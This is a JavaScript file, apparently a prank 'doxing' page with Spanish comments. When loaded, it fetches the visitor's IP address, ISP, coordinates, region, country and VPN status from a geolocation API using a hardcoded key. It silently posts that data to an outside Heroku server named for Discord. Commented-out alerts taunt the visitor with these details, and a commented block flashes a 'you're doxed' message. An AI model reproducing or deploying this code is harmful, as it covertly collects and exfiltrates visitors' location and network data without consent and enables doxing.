let apiKey = 'e299971258d44531b6a4893a1a005b94';
$.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey, function (data) {

     let infoUser = JSON.parse(JSON.stringify(data, null, 2));
     // console.log(infoUser)
     // alert(`Hola bro, al fin te encontre, despues de tantos años, ahora eres mi presa`);
     // alert('Que comienze el juego >:D');
     var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (connection) {
          $.post('https://angelrd-discord-test.herokuapp.com/send', {info: infoUser, effectiveType: connection.effectiveType}, (result) => {
               console.log(result);
          });
          // alert(`Vaya, me sorprende que uses un tipo de conexión ${connection.effectiveType}`)
     }

     var getBrowserInfo = function () {
          var ua = navigator.userAgent, tem,
               M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
          if (/trident/i.test(M[1])) {
               tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
               return 'IE ' + (tem[1] || '');
          }
          if (M[1] === 'Chrome') {
               tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
               if (tem != null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
          }
          M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
          if ((tem = ua.match(/version\/(\d+)/i)) != null) M.splice(1, 1, tem[1]);
          return M.join(' ');
     };
     // alert(`Uy bro, prepárate, pq encontre información tuya jajajajaja`);
     // alert(`Usas ${getBrowserInfo()}, verdad ${infoUser.ip_address}?`);
     // alert(`Watafak bro, que es ${infoUser.connection.isp_name}?`)
     // alert(`Vaya, me diste ganas de visitar ${infoUser.longitude} ${infoUser.latitude}`);
     // alert(`Osea ${infoUser.region}`);
     // alert(`Ah, y saludos a ${infoUser.country}`);
     // if(infoUser.security.is_vpn) {
     //      // alert(`Creíste que no me iba a dar cuenta que no usabas un vp? LOL`);
     //      // alert('Bueno, esta batalla la ganas tu mi rey');
     //      // alert('Paz');
     // }
     // if(!infoUser.security.is_vpn) { 
     //      let color = "white";
     //      setInterval(() => {
     //           if (color === 'white') {
     //                document.body.style.background="#fff";
     //                document.body.style.color='#000';
     //                document.body.innerHTML='<div>DOXEADOOOO LOLOLOLOLOL<p>Te doxeo Angel R.D XD</p></div>';
     //                color = 'black';
     //           } else {
     //                document.body.style.background="#000";
     //                document.body.style.color='#fff';
     //                document.body.innerHTML='<div>DOXEADOOOO LOLOLOLOLOL<p>Te doxeo Angel R.D XD</p></div>';
     //                color = 'white';
     //           }
     //      }, 250)
     // }
});